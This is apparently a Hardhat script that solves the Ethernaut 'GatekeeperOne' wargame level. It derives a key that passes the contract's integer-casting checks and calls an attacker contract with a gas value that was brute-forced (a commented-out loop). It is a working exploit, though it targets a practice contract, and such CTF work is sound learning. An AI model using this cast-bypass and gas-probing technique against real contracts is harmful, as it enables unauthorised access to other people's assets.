
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1] = await hre.ethers.getSigners();
    console.log(deployer.address, signer0.address, signer1.address);

    const modulo32 = hre.ethers.BigNumber.from(2**32);
    const modulo16 = 65536;

    const keyNumber = hre.ethers.BigNumber.from(modulo32).add(54338)

    const key =  hre.ethers.utils.hexZeroPad(hre.ethers.utils.hexlify(keyNumber), 8);
    console.log("Key:", key);

    // uint64(_gateKey)
    const keyUint = hre.ethers.BigNumber.from(key);
    // uint32(uint64(_gateKey))
    const lhs = keyUint.mod(modulo32);
    // uint16(uint64(_gateKey))
    const rhs1 = keyUint.mod(modulo16);

    console.log("Gate 3 part one:", rhs1.eq(lhs));
    console.log("Gate 3 part two", keyUint.eq(lhs));

    // tx.origin
    const txOrigin = "0xa518097A3843F10c06a9B9419aa02245771dD442";
    // uint160(tx.origin)
    const txOrigin_ = hre.ethers.BigNumber.from(txOrigin);
    // uint16(uint160(tx.origin))
    const rhs3 = txOrigin_.mod(modulo16);
    console.log(rhs3, "rhs3")
    console.log("Gate 3 part three:", rhs3.eq(lhs));


    const contract = await hre.ethers.getContractAt("GatekeeperOne", "0x6380a5553A84cdcaFe4331c7961442e09d7Fc8c6", signer0);
    // const contract = await hre.ethers.deployContract("GatekeeperOne", deployer);
    console.log("Contract deployed to address:", contract.address);
    console.log("Contract entrant:", await contract.entrant());
    // const testContract = await hre.ethers.deployContract("TestGatekeeperOne", [contract.address], deployer);
    const testContract = await hre.ethers.getContractAt("TestGatekeeperOne", "0x68180a8d85c867CC2806c6C7F0561acDF62cF6f8", deployer);
    console.log("Test contract deployed to:", testContract.address)

    // let gasNeeded = -1;
    // while(true) {
    //     try {
    //         gasNeeded += 1;
    //         console.log(gasNeeded);
    //         await testContract.attack(key, 8191 * 3 + gasNeeded);
    //         console.log("succes at:", gasNeeded);
    //         break;
    //     } catch(err) {

    //     }
    // }

    await testContract.attack(key, 8191 * 3 + 426, {
        gasLimit: 1000000
    });
   
    console.log("Contract entrant:", await contract.entrant());
}


main()
